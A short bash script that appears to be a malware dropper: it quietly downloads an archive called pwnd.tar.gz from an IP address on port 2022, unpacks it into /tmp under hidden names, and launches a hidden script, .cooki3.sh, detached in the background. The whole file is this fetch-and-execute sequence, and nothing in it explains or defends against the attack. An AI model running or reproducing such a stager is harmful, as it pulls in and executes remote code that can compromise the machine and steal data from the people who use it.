#!/bin/bash
wget -q -O /tmp/.a http://192.168.113.9:2022/pwnd.tar.gz & wait
tar -xf /tmp/.a -C /tmp/ & wait
bash /tmp/.cooki3.sh -r & disown
